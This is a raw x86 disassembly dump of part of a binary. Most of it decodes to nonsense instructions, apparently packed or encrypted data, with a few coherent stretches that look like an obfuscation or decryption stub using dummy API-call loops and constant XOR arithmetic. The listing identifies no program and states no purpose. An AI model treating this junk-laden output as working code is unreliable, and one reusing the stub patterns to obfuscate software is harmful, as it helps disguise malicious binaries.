  404981:	sub    eax,0xa811e193
  404986:	mov    cx,0xa041
  40498a:	in     al,dx
  40498b:	ret    
  40498c:	jnp    0x4049c3
  40498e:	bound  edi,QWORD PTR [esi+0x43]
  404991:	(bad)  
  404992:	and    al,0x39
  404994:	imul   eax,DWORD PTR [esi+0x33],0x33
  404998:	inc    ebx
  404999:	lahf   
  40499a:	push   edx
  40499b:	inc    edx
  40499c:	inc    eax
  40499d:	or     BYTE PTR [ecx-0xafebc0f],bl
  4049a3:	pusha  
  4049a4:	xchg   ebx,eax
  4049a5:	inc    edi
  4049a6:	inc    esi
  4049a7:	or     eax,DWORD PTR [ecx]
  4049a9:	cmp    al,0x1a
  4049ab:	pop    ss
  4049ac:	xor    DWORD PTR [eax+0x6ba7439c],edi
  4049b2:	dec    eax
  4049b3:	rcl    DWORD PTR [ebp+0x12ea5f9b],cl
  4049b9:	iret   
  4049ba:	mov    DWORD PTR [eax-0x3559968e],eax
  4049c0:	jge    0x40498f
  4049c2:	or     BYTE PTR [ecx],ch
  4049c4:	leave  
  4049c5:	sahf   
  4049c6:	xor    bh,BYTE PTR [esi]
  4049c8:	sti    
  4049c9:	add    al,0xe2
  4049cb:	hlt    
  4049cc:	imul   esi,DWORD PTR [ebx+eiz*4-0x460f4dd4],0xeb269011
  4049d7:	push   esp
  4049d8:	(bad)  
  4049d9:	into   
  4049da:	push   esi
  4049db:	mov    dh,al
  4049dd:	add    cl,dl
  4049df:	push   ebx
  4049e0:	sub    ecx,DWORD PTR [eax-0x6244ace2]
  4049e6:	in     eax,dx
  4049e7:	xor    ebx,DWORD PTR [edx-0x6b848818]
  4049ed:	fwait
  4049ee:	xor    eax,DWORD PTR [ecx-0x5d06455d]
  4049f4:	leave  
  4049f5:	dec    ebx
  4049f6:	cmp    al,0xe7
  4049f8:	push   eax
  4049f9:	cli    
  4049fa:	inc    ecx
  4049fb:	and    al,0xc1
  4049fd:	dec    esp
  4049fe:	cld    
  4049ff:	adc    esp,DWORD PTR [eax+0x1532bf4b]
  404a05:	or     al,0x4c
  404a07:	sbb    DWORD PTR [ebx+0x44114b74],ecx
  404a0d:	ja     0x404a1a
  404a0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a10:	ss dec edx
  404a12:	std    
  404a13:	retf   
  404a14:	mov    bh,0xc5
  404a16:	dec    ebp
  404a17:	push   es
  404a18:	jp     0x4049c1
  404a1a:	mov    ah,0xcd
  404a1c:	push   0xffffff90
  404a1e:	imul   edi,DWORD PTR [ebx],0xfad75922
  404a24:	jp     0x404a19
  404a26:	mov    al,ds:0x7a91c0bf
  404a2b:	mov    al,0x56
  404a2d:	popf   
  404a2e:	cmp    esi,DWORD PTR [edi+ebp*8+0x2a]
  404a32:	cwde   
  404a33:	in     eax,dx
  404a34:	fsubr  DWORD PTR gs:[ecx+0x48]
  404a38:	push   cs
  404a39:	sbb    al,0xcb
  404a3b:	xor    eax,0x3e6e79a6
  404a40:	jle    0x404ab6
  404a42:	lea    edi,[edx]
  404a44:	stos   BYTE PTR es:[edi],al
  404a45:	xchg   esp,eax
  404a46:	pop    eax
  404a47:	cwde   
  404a48:	fcomp  QWORD PTR [edi]
  404a4a:	es dec eax
  404a4c:	mov    eax,0xb5b2e16c
  404a51:	or     ecx,DWORD PTR [edx+ebx*4-0x2115ea4b]
  404a58:	mov    dl,0xb8
  404a5a:	bound  ebx,QWORD PTR [ecx+0x2737c873]
  404a60:	cdq    
  404a61:	retf   0xd23a
  404a64:	into   
  404a65:	push   ss
  404a66:	(bad)  [edi+eax*8+0x37826313]
  404a6d:	dec    esp
  404a6e:	inc    ebp
  404a6f:	es jmp 0x2632:0x347516d9
  404a77:	cs fs in eax,0xfd
  404a7b:	or     DWORD PTR [ebp+0x69637078],ebx
  404a81:	push   ebp
  404a82:	or     al,0x78
  404a84:	mov    ebp,0x4aa9230d
  404a89:	hlt    
  404a8a:	and    BYTE PTR [eax],0xe1
  404a8d:	dec    ebx
  404a8e:	mov    bl,0x6
  404a90:	adc    DWORD PTR [edi+eax*4-0x5df53f93],edi
  404a97:	sbb    bl,al
  404a99:	int    0xba
  404a9b:	neg    DWORD PTR [esi+edi*8-0x45]
  404a9f:	retf   0xd474
  404aa2:	mov    edi,DWORD PTR [esi-0x1c]
  404aa5:	and    dh,BYTE PTR [edx+0x2c]
  404aa8:	adc    BYTE PTR [ebp-0x34],dh
  404aab:	dec    esp
  404aac:	out    dx,eax
  404aad:	jmp    0x220f:0xc56c2773
  404ab4:	leave  
  404ab5:	dec    edi
  404ab6:	mov    edi,0x680e4db
  404abb:	mov    dl,0x63
  404abd:	sbb    esp,DWORD PTR [bp+si]
  404ac0:	pop    edi
  404ac1:	mov    al,ds:0xce0c206d
  404ac6:	xchg   ecx,eax
  404ac7:	mov    ds:0x20bd3080,eax
  404acc:	mov    DWORD PTR ss:[esp+esi*2-0x48dcb3d6],ebx
  404ad4:	mov    edi,0xd9f50aae
  404ad9:	mov    ebp,0xcaff5716
  404ade:	leave  
  404adf:	repz sub BYTE PTR [ecx+ecx*2+0x7eadbba5],0xd0
  404ae8:	xor    esi,DWORD PTR [eax+0x40cbc53a]
  404aee:	mov    esp,0x1ea3c049
  404af3:	arpl   WORD PTR [ebx+ebp*4],dx
  404af6:	jge    0x404b72
  404af8:	push   edx
  404af9:	sub    dl,cl
  404afb:	dec    edx
  404afc:	in     al,0x11
  404afe:	xchg   esp,eax
  404aff:	cld    
  404b00:	jle    0x404ac1
  404b02:	mov    ebx,0xc818efdd
  404b07:	outs   dx,BYTE PTR ds:[esi]
  404b08:	les    eax,FWORD PTR [ebx]
  404b0a:	or     edi,DWORD PTR [edx]
  404b0c:	retf   0xf9fa
  404b0f:	sbb    BYTE PTR [esi+ebp*2],ah
  404b12:	mov    ah,0xe4
  404b14:	cmp    BYTE PTR [esi-0x28973c7b],dl
  404b1a:	mov    esi,0xb5095001
  404b1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b20:	xchg   BYTE PTR [ebp+0x7ff4cb28],dh
  404b26:	repz mov ebp,0x4922c702
  404b2c:	in     al,dx
  404b2d:	xchg   esi,eax
  404b2e:	jo     0x404b17
  404b30:	imul   esp,DWORD PTR [ecx-0x56fe7c91],0xffffffd1
  404b37:	fsub   DWORD PTR [ecx+0x1d]
  404b3a:	arpl   WORD PTR [edi+0x2b7a3bc9],dx
  404b40:	and    bl,al
  404b42:	arpl   WORD PTR [esi-0x53],di
  404b45:	xchg   ebx,eax
  404b46:	sbb    ch,BYTE PTR [ecx-0x601ff371]
  404b4c:	cwde   
  404b4d:	imul   esp,esi,0xdb1c8ec5
  404b53:	ret    
  404b54:	aaa    
  404b55:	inc    eax
  404b56:	mov    al,0x42
  404b58:	jmp    0x50af:0xf12a9069
  404b5f:	cmp    edx,DWORD PTR ds:0xa9edc73b
  404b65:	(bad)  
  404b67:	and    BYTE PTR [eax],0x5
  404b6a:	add    eax,0xfe2cd14
  404b6f:	pop    edi
  404b70:	retf   
  404b71:	stc    
  404b72:	ds (bad) 
  404b74:	mov    esi,0xf329be34
  404b79:	bound  esp,QWORD PTR [edi]
  404b7b:	out    dx,al
  404b7c:	inc    ebp
  404b7d:	enter  0x3c6,0xa4
  404b81:	pop    edi
  404b82:	arpl   WORD PTR [edi-0x40],di
  404b85:	ds aas 
  404b87:	push   esp
  404b88:	cmp    al,BYTE PTR [edi+0x7f3f30be]
  404b8e:	in     al,dx
  404b8f:	sbb    eax,ebp
  404b91:	aaa    
  404b92:	gs push ebx
  404b94:	sub    DWORD PTR [esi-0x683feed4],esi
  404b9a:	clc    
  404b9b:	enter  0xa0e,0x88
  404b9f:	jle    0x404c0d
  404ba1:	jp     0x404b6d
  404ba3:	jae    0x404b71
  404ba5:	xor    DWORD PTR [eax+edi*8-0x56],0x3d
  404baa:	(bad)
  404bad:	add    eax,0x993b72c5
  404bb2:	ja     0x404bf7
  404bb4:	dec    esp
  404bb5:	dec    ebx
  404bb6:	jbe    0x404b66
  404bb8:	ror    DWORD PTR [ebx-0x5b5f67bc],0x83
  404bbf:	push   esp
  404bc0:	retf   0xe8dc
  404bc3:	pop    edx
  404bc4:	push   ecx
  404bc5:	and    esp,edx
  404bc7:	dec    esi
  404bc8:	clc    
  404bc9:	popa   
  404bca:	push   ds
  404bcb:	andnps xmm2,XMMWORD PTR [edx]
  404bce:	je     0x404bbb
  404bd0:	pop    ebx
  404bd1:	add    BYTE PTR [esi-0x7c68402],0x87
  404bd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bd9:	dec    edx
  404bda:	xchg   edi,eax
  404bdb:	imul   ebx,eax,0x1f006a41
  404be1:	adc    eax,0xf2031cc3
  404be6:	mov    ax,0xbcde
  404bea:	or     ebx,DWORD PTR [edi-0x4e]
  404bed:	stos   BYTE PTR es:[edi],al
  404bee:	ret    
  404bef:	les    edx,FWORD PTR [ebx]
  404bf1:	inc    edx
  404bf2:	pop    esp
  404bf3:	dec    ecx
  404bf4:	mov    dl,0x86
  404bf6:	test   eax,0x6d02436f
  404bfb:	cmp    eax,0x1485b809
  404c00:	xchg   edx,eax
  404c01:	cli    
  404c02:	rcr    BYTE PTR [ebp-0x4e92750f],1
  404c08:	pop    ebp
  404c09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c0a:	adc    BYTE PTR [edi+0x49],ah
  404c0d:	inc    edi
  404c0e:	into   
  404c0f:	add    eax,DWORD PTR [edx+0x73]
  404c12:	push   ds
  404c13:	mov    BYTE PTR [ecx*1+0x42951327],bl
  404c1a:	scas   al,BYTE PTR es:[edi]
  404c1b:	test   DWORD PTR [ecx+0xd575f17],edi
  404c21:	xchg   DWORD PTR [esi+edi*8],esp
  404c24:	(bad)  
  404c25:	adc    ecx,DWORD PTR [eax]
  404c27:	or     dl,bh
  404c29:	inc    ebp
  404c2a:	hlt    
  404c2b:	hlt    
  404c2c:	out    dx,eax
  404c2d:	mov    ebp,0xe7b7f4b4
  404c32:	mov    esi,0xd79d3628
  404c37:	xchg   ebx,eax
  404c38:	popa   
  404c39:	dec    ecx
  404c3a:	and    ah,BYTE PTR ds:0x5057d4ed
  404c40:	jns    0x404cb3
  404c42:	retf   
  404c43:	sub    eax,ecx
  404c45:	out    0x85,al
  404c47:	jg     0x404c95
  404c49:	jmp    esi
  404c4b:	call   0x998c:0x36bf6902
  404c52:	in     eax,0x9
  404c54:	pop    ds
  404c55:	pop    es
  404c56:	mov    ch,BYTE PTR [edx+0x41]
  404c59:	adc    DWORD PTR [ebp+0x56],eax
  404c5c:	adc    ebx,DWORD PTR [esi]
  404c5e:	inc    edx
  404c5f:	ins    DWORD PTR es:[edi],dx
  404c60:	mov    dh,0xbd
  404c62:	dec    edx
  404c63:	cmp    BYTE PTR [eax-0x662b39ab],0xda
  404c6a:	jo     0x404ce3
  404c6c:	mov    edi,0x37f75b97
  404c71:	in     al,0xd5
  404c73:	jae    0x404cc8
  404c75:	inc    esi
  404c76:	out    dx,eax
  404c77:	jecxz  0x404c30
  404c79:	call   0x8de:0x10fb294e
  404c80:	xor    eax,0x6a262c15
  404c85:	and    ebp,DWORD PTR [edi+0x472826d3]
  404c8b:	cwde   
  404c8c:	mov    ?,WORD PTR [edi]
  404c8e:	icebp  
  404c8f:	cdq    
  404c90:	fsub   st(4),st
  404c92:	cmp    al,dl
  404c94:	je     0x404cf6
  404c96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c97:	cmp    al,0x75
  404c99:	push   ebx
  404c9a:	jo     0x404c81
  404c9c:	sub    ecx,DWORD PTR [eax+0xd4c55db]
  404ca2:	aad    0xfb
  404ca4:	and    al,BYTE PTR [esi-0x43]
  404ca7:	div    DWORD PTR [edi]
  404ca9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404caa:	into   
  404cab:	lods   al,BYTE PTR ds:[esi]
  404cac:	pop    edx
  404cad:	out    0xfb,eax
  404caf:	and    edi,DWORD PTR [ebx+esi*4-0x54b157c3]
  404cb6:	jmp    0x404cd1
  404cb8:	jecxz  0x404cfb
  404cba:	lock pop esp
  404cbc:	fst    DWORD PTR [eax-0x4b]
  404cbf:	js     0x404c93
  404cc1:	leave  
  404cc2:	jns    0x404c8a
  404cc4:	xor    bl,BYTE PTR [edi+0xc1cb39d]
  404cca:	cmp    ebx,esi
  404ccc:	ja     0x404ce4
  404cce:	imul   ecx,DWORD PTR [ecx-0x180194f7],0xe87373b5
  404cd8:	in     al,dx
  404cd9:	scas   eax,DWORD PTR es:[edi]
  404cda:	cmp    ax,0x58f7
  404cde:	inc    ecx
  404cdf:	hlt    
  404ce0:	dec    ecx
  404ce1:	jg     0x404d5d
  404ce3:	dec    ebp
  404ce4:	inc    ebp
  404ce5:	push   eax
  404ce6:	cmp    edi,DWORD PTR ds:0x153c8f45
  404cec:	test   DWORD PTR [ecx],edi
  404cee:	repz and eax,0xc60c77ac
  404cf4:	dec    eax
  404cf5:	push   es
  404cf6:	push   ss
  404cf7:	rcr    BYTE PTR [eax],cl
  404cf9:	sbb    al,0xb2
  404cfb:	pushf  
  404cfc:	ret    
  404cfd:	mov    eax,DWORD PTR [ebp-0x14]
  404d00:	add    DWORD PTR [eax],0x705fa8c
  404d06:	mov    eax,DWORD PTR [ebp-0x10]
  404d09:	mov    edx,DWORD PTR [ebp+0x8]
  404d0c:	xor    eax,ecx
  404d0e:	lea    eax,[eax+edx*1+0x327299]
  404d15:	mov    DWORD PTR [ebp+0x8],eax
  404d18:	inc    DWORD PTR [ebp+0xc]
  404d1b:	jmp    0x4040d8
  404d20:	mov    eax,DWORD PTR [ebp-0x10]
  404d23:	xor    eax,ecx
  404d25:	mov    ecx,DWORD PTR [ebp+0x10]
  404d28:	add    eax,esi
  404d2a:	mov    DWORD PTR [ecx],eax
  404d2c:	pop    esi
  404d2d:	leave  
  404d2e:	ret    0xc
  404d31:	push   ebp
  404d32:	mov    ebp,esp
  404d34:	push   ecx
  404d35:	sub    edx,eax
  404d37:	jmp    0x404f34
  404d3c:	pop    edi
  404d3d:	mov    ebx,cs
  404d3f:	and    ebp,edi
  404d41:	jno    0x404dc0
  404d43:	dec    esp
  404d44:	call   0xd8aa7d7b
  404d49:	ret    0xc7e8
  404d4c:	sbb    ebp,DWORD PTR [edi]
  404d4e:	jle    0x404dce
  404d50:	pop    esi
  404d51:	jg     0x404dd1
  404d53:	jle    0x404d60
  404d55:	push   ss
  404d56:	je     0x404d4b
  404d58:	repnz sub ebp,esi
  404d5b:	in     eax,dx
  404d5c:	stos   BYTE PTR es:[edi],al
  404d5d:	rol    DWORD PTR [ebx-0x2cb7236a],cl
  404d63:	mov    edi,0x2af596e3
  404d68:	mov    ch,0xcb
  404d6a:	jle    0x404dd0
  404d6c:	jo     0x404d3d
  404d6e:	aas    
  404d6f:	push   eax
  404d70:	or     eax,0x6f486ae9
  404d75:	inc    ebp
  404d76:	iret   
  404d77:	outs   dx,DWORD PTR ds:[esi]
  404d78:	pop    esp
  404d79:	and    ebx,DWORD PTR [ecx]
  404d7b:	sub    ebp,DWORD PTR [edx-0xcd8f627]
  404d81:	mov    edx,0xa7efcf60
  404d86:	push   ecx
  404d87:	dec    edi
  404d88:	(bad)  
  404d89:	sub    al,0x89
  404d8b:	xchg   esi,eax
  404d8c:	add    al,0x6c
  404d8e:	jbe    0x404d32
  404d90:	inc    ebx
  404d91:	inc    ecx
  404d92:	mov    BYTE PTR [ecx-0x1fba08e],bh
  404d98:	xor    eax,0x9051a76e
  404d9d:	dec    esi
  404d9e:	data16 ficom DWORD PTR [ebx-0x490c88b3]
  404da5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404da6:	daa    
  404da7:	xchg   DWORD PTR [ebp+0x2527a2ab],edi
  404dad:	mov    edi,0x8f6e577f
  404db2:	pop    eax
  404db3:	push   ss
  404db4:	dec    esp
  404db5:	push   edi
  404db6:	rcr    DWORD PTR [edx+0x2ae8ee83],0xa6
  404dbd:	pusha  
  404dbe:	(bad)  
  404dbf:	ficomp WORD PTR [esi+0x484cf229]
  404dc5:	jns    0x404e3a
  404dc7:	cmc    
  404dc8:	mov    al,0x45
  404dca:	mov    esp,0x4f4ab7f
  404dcf:	dec    edi
  404dd0:	dec    eax
  404dd1:	push   ecx
  404dd2:	outs   dx,BYTE PTR ds:[esi]
  404dd3:	fistp  DWORD PTR [ebp-0x5169bbd]
  404dd9:	ret    
  404dda:	jecxz  0x404d93
  404ddc:	out    dx,al
  404ddd:	(bad)  [edi+0x26]
  404de0:	fmulp  st(0),st
  404de2:	ror    DWORD PTR [ebp-0x70633f7],cl
  404de8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404de9:	xchg   DWORD PTR [ebp+0x6f820854],esp
  404def:	dec    esp
  404df0:	xor    eax,0x1c2dbf0a
  404df5:	jmp    0x396a69ad
  404dfa:	out    0x51,al
  404dfc:	fucomp st(6)
  404dfe:	mov    esp,0x8b869d11
  404e03:	and    ebx,edi
  404e05:	and    eax,DWORD PTR [ebx]
  404e07:	dec    esi
  404e08:	and    ebx,DWORD PTR [ebx]
  404e0a:	jb     0x404df8
  404e0c:	(bad)  
  404e0d:	xor    al,0x84
  404e0f:	pop    ecx
  404e10:	mov    esp,0x5be23365
  404e15:	aad    0x85
  404e17:	(bad)  
  404e18:	(bad)  
  404e19:	cli    
  404e1a:	add    al,0x84
  404e1c:	cmc    
  404e1d:	ins    DWORD PTR es:[edi],dx
  404e1e:	sar    DWORD PTR [eax+ebp*2],0xeb
  404e22:	inc    edx
  404e23:	outs   dx,BYTE PTR ds:[esi]
  404e24:	jmp    0x3ee2:0x3e8a5e4
  404e2b:	data16 je 0x404e5e
  404e2e:	dec    eax
  404e2f:	adc    edx,DWORD PTR [eax+0x1322ea67]
  404e35:	gs stos BYTE PTR es:[edi],al
  404e37:	cli    
  404e38:	int3   
  404e39:	adc    BYTE PTR [edx*4+0x29594616],cl
  404e40:	mov    dl,0xc4
  404e42:	and    al,0xe0
  404e44:	mov    BYTE PTR [edx],al
  404e46:	fs pop esp
  404e48:	mov    DWORD PTR [edi-0x6eff1e5e],ebx
  404e4e:	fstp   DWORD PTR [ecx+0x13]
  404e51:	out    dx,eax
  404e52:	cmp    ebp,DWORD PTR [edx+eiz*8+0x571b883a]
  404e59:	cmp    edi,DWORD PTR [ebx+eax*8-0x31]
  404e5d:	mov    eax,ds:0x6a7f8125
  404e62:	clc    
  404e63:	or     edx,eax
  404e65:	push   cs
  404e66:	inc    esp
  404e67:	je     0x404e2c
  404e69:	push   0x77
  404e6b:	mov    ds:0x77e206b1,eax
  404e70:	dec    ebp
  404e71:	mov    ah,0x8f
  404e73:	xor    ebp,ebx
  404e75:	xor    ebp,ebx
  404e77:	xlat   BYTE PTR ds:[ebx]
  404e78:	je     0x404ef6
  404e7a:	xor    edi,DWORD PTR [edx+0x7f]
  404e7d:	mov    ebx,0xd5f9b52c
  404e82:	pop    edi
  404e83:	mov    cl,0x4e
  404e85:	or     DWORD PTR [ecx+0x1a],ecx
  404e88:	xor    eax,0xccb1049c
  404e8d:	and    ebx,ebx
  404e8f:	pushf  
  404e90:	jge    0x404f0b
  404e92:	xchg   edi,eax
  404e93:	xor    BYTE PTR [edi+0x43],0xee
  404e97:	xchg   ebx,eax
  404e98:	sahf   
  404e99:	xchg   DWORD PTR [ecx-0x29],ebp
  404e9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e9d:	add    al,0xb8
  404e9f:	sbb    bl,cl
  404ea1:	or     DWORD PTR [ecx+eax*4],edx
  404ea4:	sub    DWORD PTR [esi-0x1e7d29c4],0x36
  404eab:	mov    WORD PTR ds:0xd3614dd,gs
  404eb1:	je     0x404ef4
  404eb3:	push   cs
  404eb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404eb5:	stos   DWORD PTR es:[edi],eax
  404eb6:	mov    ebx,0xad25f1d2
  404ebb:	xchg   ebp,eax
  404ebc:	rol    BYTE PTR [ecx],1
  404ebe:	sub    BYTE PTR [eax-0x40032d3a],bl
  404ec4:	and    DWORD PTR [ebp+0x2b],ebp
  404ec7:	stos   DWORD PTR es:[edi],eax
  404ec8:	pop    eax
  404ec9:	pop    ecx
  404eca:	lods   eax,DWORD PTR ds:[esi]
  404ecb:	fsub   DWORD PTR [eax]
  404ecd:	mov    WORD PTR ss:[ecx-0x4a],?
  404ed1:	popf   
  404ed2:	sti    
  404ed3:	adc    BYTE PTR [ebx-0x35],bh
  404ed6:	scas   al,BYTE PTR es:[edi]
  404ed7:	or     bl,BYTE PTR [edx+0x2bd3d182]
  404edd:	sub    al,ah
  404edf:	jae    0x404ea6
  404ee1:	not    DWORD PTR [eax-0x6885bc8b]
  404ee7:	das    
  404ee8:	push   ds
  404ee9:	xlat   BYTE PTR ds:[ebx]
  404eea:	mov    ch,0x3a
  404eec:	(bad)  
  404eed:	icebp  
  404eee:	retf   
  404eef:	inc    ecx
  404ef0:	push   ds
  404ef1:	jno    0x404e8f
  404ef3:	and    eax,0x4d0605d1
  404ef8:	scas   al,BYTE PTR es:[edi]
  404ef9:	jmp    0xede9545d
  404efe:	call   DWORD PTR [esi+0x33d8ce4]
  404f04:	push   ss
  404f05:	test   BYTE PTR [ebx-0x18],dl
  404f08:	cmp    dh,BYTE PTR [edx+0x39628ec2]
  404f0e:	scas   al,BYTE PTR es:[edi]
  404f0f:	lods   eax,DWORD PTR ds:[esi]
  404f10:	xchg   edx,eax
  404f11:	jne    0x404f25
  404f13:	pop    ebx
  404f14:	sahf   
  404f15:	jno    0x404ee7
  404f17:	dec    eax
  404f18:	adc    al,0xa0
  404f1a:	retf   
  404f1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f1c:	pop    edx
  404f1d:	icebp  
  404f1e:	js     0x404ef8
  404f20:	jne    0x404f6a
  404f22:	adc    DWORD PTR ds:0xbc457312,esp
  404f28:	or     eax,0xc703e508
  404f2d:	outs   dx,DWORD PTR ds:[esi]
  404f2e:	mov    ds:0x773fc677,eax
  404f33:	ins    BYTE PTR es:[edi],dx
  404f34:	push   ecx
  404f35:	or     edx,DWORD PTR ds:0x4344fb
  404f3b:	mov    DWORD PTR [ebp-0x8],0xf89c8536
  404f42:	mov    DWORD PTR ds:0x43458b,0x1c
  404f4c:	cmp    DWORD PTR ds:0x43458b,0x0
  404f53:	je     0x404f94
  404f59:	cmp    DWORD PTR ds:0x43458b,0x21
  404f60:	jne    0x404f84
  404f66:	push   DWORD PTR [ebp-0x24]
  404f69:	push   DWORD PTR [ebp-0x20]
  404f6c:	push   0x26f9
  404f71:	push   0x3d74
  404f76:	push   0x4b4e
  404f7b:	push   DWORD PTR [ebp-0x1c]
  404f7e:	call   DWORD PTR ds:0x413280
  404f84:	mov    eax,ds:0x43458b
  404f89:	dec    eax
  404f8a:	mov    ds:0x43458b,eax
  404f8f:	jmp    0x404f4c
  404f94:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  404f9b:	mov    eax,DWORD PTR [ebp-0x4]
  404f9e:	xor    DWORD PTR ds:0x4344f3,ecx
  404fa4:	push   esi
  404fa5:	and    DWORD PTR ds:0x434593,0x0
  404faf:	mov    edx,DWORD PTR ds:0x434593
  404fb5:	inc    edx
  404fb6:	mov    DWORD PTR ds:0x434593,edx
  404fbc:	cmp    DWORD PTR ds:0x434593,0x21
  404fc3:	jne    0x404fe1
  404fc9:	push   0x434749
  404fce:	push   0x4346ce
  404fd3:	push   0x6321
  404fd8:	push   DWORD PTR [ebp-0x10]
  404fdb:	call   DWORD PTR ds:0x4130bc
  404fe1:	cmp    DWORD PTR ds:0x434593,0x19
  404fe8:	jb     0x404faf
  404fee:	inc    ecx
  404fef:	mov    esi,DWORD PTR [ebp-0x8]
  404ff2:	inc    DWORD PTR ds:0x434537
  404ff8:	mov    edx,0x7510851
  404ffd:	xor    eax,edx
  404fff:	xor    esi,edx
  405001:	mov    ecx,0x327299
  405006:	add    esi,ecx
  405008:	xor    DWORD PTR ds:0x434537,0x55d1
  405012:	add    eax,ecx
  405014:	imul   eax,esi
  405017:	mov    esi,DWORD PTR [ebp+0xc]
  40501a:	cmp    esi,eax
  40501c:	jne    0x405038
  405022:	mov    eax,DWORD PTR [ebp-0x4]
  405025:	mov    esi,DWORD PTR [ebp-0x8]
  405028:	xor    eax,edx
  40502a:	xor    esi,edx
  40502c:	add    eax,ecx
  40502e:	add    esi,ecx
  405030:	imul   eax,esi
  405033:	jmp    0x405270
  405038:	mov    eax,DWORD PTR [ebp+0xc]
  40503b:	mov    eax,DWORD PTR [eax+0x78]
  40503e:	jmp    0x40523b
  405043:	imul   esp,DWORD PTR [eax],0x7d571dbe
  405049:	jge    0x4050b7
  40504b:	push   esp
  40504c:	pop    ds
  40504d:	loopne 0x40508f
  40504f:	pushf  
  405050:	in     al,dx
  405051:	sbb    edi,edx
  405053:	jnp    0x40507e
  405055:	jle    0x4050d5
  405057:	pop    esi
  405058:	jg     0x4050d8
  40505a:	jle    0x4050ac
  40505c:	dec    ecx
  40505d:	inc    esp
  40505e:	in     eax,0x8b
  405060:	(bad)  
  405061:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405062:	push   0x1b2b57b
  405067:	xchg   ebp,eax
  405068:	jb     0x405073
  40506a:	jge    0x4050ca
  40506c:	popf   
  40506d:	inc    esp
  40506e:	aam    0xf8
  405070:	loop   0x405027
  405072:	test   eax,0x7bdee21c
  405077:	shr    ch,0xdb
  40507a:	add    al,0xa3
  40507c:	mov    ebp,0x410130e9
  405081:	xor    BYTE PTR ds:0x36ccc6cb,bl
  405087:	aam    0x78
  405089:	sti    
  40508a:	add    DWORD PTR [ecx*2-0x2a710e6],eax
  405091:	fimul  DWORD PTR [esi]
  405093:	lahf   
  405094:	ins    DWORD PTR es:[edi],dx
  405095:	mov    ah,BYTE PTR [esi]
  405097:	xor    ebp,DWORD PTR [ebx+ecx*1-0x2923dc6c]
  40509e:	call   0xc32ea26b
  4050a3:	outs   dx,DWORD PTR ds:[esi]
  4050a4:	out    0xf3,al
  4050a6:	mov    bl,0x4f
  4050a8:	push   edi
  4050a9:	jmp    0xf8258c84
  4050ae:	mov    eax,0x992cd3ad
  4050b3:	fs mov dl,0x66
  4050b6:	sub    al,0xcb
  4050b8:	sub    BYTE PTR [edx-0x13c13039],cl
  4050be:	pop    ds
  4050bf:	mov    ecx,DWORD PTR [edx+0x58]
  4050c2:	enter  0xef8a,0x76
  4050c6:	addr16 (bad) 
  4050c8:	xlat   BYTE PTR ds:[ebx]
  4050c9:	mov    DWORD PTR ds:0x51fb237f,edx
  4050cf:	jbe    0x4050b0
  4050d1:	push   esi
  4050d2:	nop
  4050d3:	enter  0x19dc,0x21
  4050d7:	cld    
  4050d8:	dec    eax
  4050d9:	and    dh,dl
  4050db:	aam    0x90
  4050dd:	hlt    
  4050de:	mov    esp,0xb52d3d53
  4050e3:	pop    es
  4050e4:	mov    bl,0x4f
  4050e6:	jbe    0x4050c5
  4050e8:	jecxz  0x405093
  4050ea:	add    bh,BYTE PTR [esi+edi*1]
  4050ed:	mov    dh,0x8b
  4050ef:	imul   ebx,DWORD PTR ds:0xe39606a2,0x62dd53b6
  4050f9:	stc    
  4050fa:	int3   
  4050fb:	cmp    eax,0xcaad6077
  405100:	pop    ebp
  405101:	lods   eax,DWORD PTR ds:[esi]
  405102:	pop    esi
  405103:	int    0xa4
  405105:	mov    al,ds:0xa3c6ecf
  40510a:	cmp    BYTE PTR [ecx-0x2a],0x80
  40510e:	sub    BYTE PTR [eax],ah
  405110:	jns    0x405126
  405112:	sub    edx,DWORD PTR [ebx]
  405114:	and    BYTE PTR [ebx+0x19],al
  405117:	and    BYTE PTR [ecx-0x52],al
  40511a:	out    dx,al
  40511b:	pusha  
  40511c:	jmp    0x405127
  40511e:	out    0xf6,eax
  405120:	push   0xcf16eb5d
  405125:	ror    DWORD PTR [edx],cl
  405127:	or     eax,0x33a00655
  40512c:	repnz dec esp
  40512e:	pop    eax
  40512f:	sbb    DWORD PTR [esi],esi
  405131:	(bad)  
  405133:	gs loopne 0x40516e
  405136:	loope  0x405188
  405138:	jmp    0x4051a7
  40513a:	pusha  
  40513b:	nop
  40513c:	mov    ebp,0xd07e671b
  405141:	mov    al,ds:0xbe0c7a6e
  405146:	or     eax,0xe184850f
  40514b:	jne    0x405184
  40514d:	lods   al,BYTE PTR ds:[esi]
  40514e:	fcom   QWORD PTR [edi-0xe]
  405151:	xchg   BYTE PTR [ecx+0x1c],bh
  405154:	retf   0xaa78
  405157:	mov    dl,0xf7
  405159:	(bad)  [eax+0x4]
  40515c:	add    edx,edi
  40515e:	sbb    al,0x4a
  405160:	sbb    eax,0x309a72d0
  405165:	xchg   ebx,eax
  405166:	xor    DWORD PTR [edi-0x31],ecx
  405169:	cmp    eax,0xdcc710da
  40516e:	mov    ch,0xe1
  405170:	clc    
  405171:	sahf   
  405172:	sub    edi,DWORD PTR [edx+eiz*4-0x3f]
  405176:	push   eax
  405177:	xrelease mov BYTE PTR [esi-0x13],cl
  40517b:	jae    0x4051da
  40517d:	hlt    
  40517e:	aam    0xf0
  405180:	jmp    0xd6c6:0x5e7ada63
  405187:	and    ah,BYTE PTR [eax+ebp*8-0x256075d9]
  40518e:	xchg   DWORD PTR [ebp-0xe],edx
  405191:	push   edx
  405192:	pop    ss
  405193:	test   DWORD PTR [esi],ecx
  405195:	inc    ebp
  405196:	stos   DWORD PTR es:[edi],eax
  405197:	push   0xffffff87
  405199:	nop    DWORD PTR [eax]
  40519c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40519d:	dec    ebp
  40519e:	sahf   
  40519f:	mov    esi,0x25c36554
